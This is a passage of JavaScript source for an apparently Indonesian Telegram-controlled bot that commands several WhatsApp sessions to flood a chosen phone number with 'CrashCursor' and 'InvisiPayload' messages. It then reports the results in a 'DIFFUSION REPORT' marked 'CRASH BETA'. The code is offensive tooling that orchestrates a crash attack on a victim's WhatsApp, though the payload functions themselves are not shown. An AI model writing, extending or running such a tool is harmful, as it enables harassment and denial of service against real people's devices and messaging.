        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 2; i++) {
        await CrashCursor(sock, target);
        await InvisiPayload(sock, target);
        await InvisiPayload(sock, target);
        await CrashCursor(sock, target);
  }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃      *DIFFUSION REPORT*
┣━━━━━━━━━━━━━━━━━━━━━
┃*⌬* *TARGET* *:* *${formattedNumber}*
┃*⌬* *TYPE* *:* *CRASH BETA*
┃*⌬* *SUCCES* *:* *${successCount}*
┃*⌬* *FAILED* *:* *${failCount}*
┃*⌬* *TOTAL NUMBER* *:* *${sessions.size}*
┗━━━━━━━━━━━━━━━━━━━━━`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

bot.onText(/\/deliondevabal" (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber, ...messageWords] = match[1].split(" ");
  const message = messageWords.join(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `TARGET : ${formattedNumber}\nTOTALBOT ${sessions.size}`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        for (let i = 0; i < 4; i++) {
        await CrashCursor(sock, target);
        await InvisiPayload(sock, target);
        await InvisiPayload(sock, target);
        await CrashCursor(sock, target);
  }
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `  
┏━━━━━━━━━━━━━━━━━━━━━
┃      *DIFFUSION REPORT*
┣━━━━━━━━━━━━━━━━━━━━━
┃*⌬* *TARGET* *:* *${formattedNumber}*
┃*⌬* *TYPE* *:* *$INVISIPAYLOAD*
┃*⌬* *SUCCES* *:* *${successCount}*
┃*⌬* *FAILED* *:* *${failCount}*
┃*⌬* *TOTAL NUMBER* *:* *${sessions.size}*
┗━━━━━━━━━━━━━━━━━━━━━`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
    );
  }
});

console.log("Bot telah dimulai...");